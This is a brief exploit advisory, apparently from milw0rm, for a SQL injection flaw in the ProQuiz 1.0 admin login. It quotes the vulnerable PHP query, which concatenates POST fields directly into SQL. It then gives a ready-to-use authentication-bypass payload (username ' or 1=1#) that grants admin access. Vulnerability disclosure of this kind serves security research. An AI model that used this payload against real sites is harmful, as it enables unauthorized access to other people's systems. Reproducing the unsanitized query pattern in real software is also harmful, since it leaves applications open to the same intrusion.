@@ -1,0 +1,32 @@
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ [0] GENERAL DETAILS:
+
+Name           :  ProQuiz 1.0 Sql Injection (Auth bypass)
+Download       :  http://sourceforge.net/project/downloading.php?group_id=246466&use_mirror=kent&filename=ProQuiz.zip&65145754
+Vulnerability  :  Sql Injection (Admin Login Bypass)
+Author         :  Osirys
+Contact        :  osirys[at]live[dot]it
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ [1] BUG EXPLANATION:
+
+The affected file is /admin/index.php. Let's see the code.
+
+[CODE]
+if($_GET['menu'] != 'madmin')
+	{
+	if(isset($_POST['username']) && isset($_POST['password']))
+		{
+			$query = "SELECT * FROM ".$member_admin." WHERE `username` = '".$_POST['username']."' AND `password` = '".$_POST['password']."' ";
+[/CODE]
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ [2] EXPLOITATION:
+
+Just go in /[path]/admin/index.php. Login with the following details:
+Username : ' or 1=1#
+Password : anything
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2008-12-09]
